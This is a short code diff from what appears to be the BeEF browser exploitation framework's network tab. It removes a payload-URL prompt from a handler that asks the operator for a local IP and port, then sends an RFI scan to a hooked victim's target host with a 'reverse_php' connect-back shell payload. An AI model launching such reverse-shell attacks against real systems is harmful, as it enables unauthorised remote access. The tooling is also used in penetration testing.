@@ -436,12 +436,11 @@ ZombieTab_Network = function(zombie) {
                                                                 var mod_id = get_module_id("rfi_scanner");
                                                                 var lhost = prompt("Enter local IP for connect back shell:", 'LHOST');
                                                                 var lport = prompt("Enter local port for connect back shell:", 'LPORT');
-                                                                var payload_url = prompt("Enter BeEF server URL:", 'http://beef_host:beef_port/');
 								alert("Now start your reverse shell handler on " + lhost + ':' + lport);
                                                                 commands_statusbar.update_sending('Shellshock scanning ' + ip + '...');
                                                                 $jwterm.ajax({
                                                                         contentType: 'application/json',
-                                                                        data: JSON.stringify({"rproto":proto, "rhost":ip, "rport":port, "lhost":lhost, "lport":lport, "payload_url":payload_url, "payload":"reverse_php"}),
+                                                                        data: JSON.stringify({"rproto":proto, "rhost":ip, "rport":port, "lhost":lhost, "lport":lport, "payload":"reverse_php"}),
                                                                         dataType: 'json',
                                                                         type: 'POST',
                                                                         url: "/api/modules/" + zombie.session + "/" + mod_id + "?token=" + token,
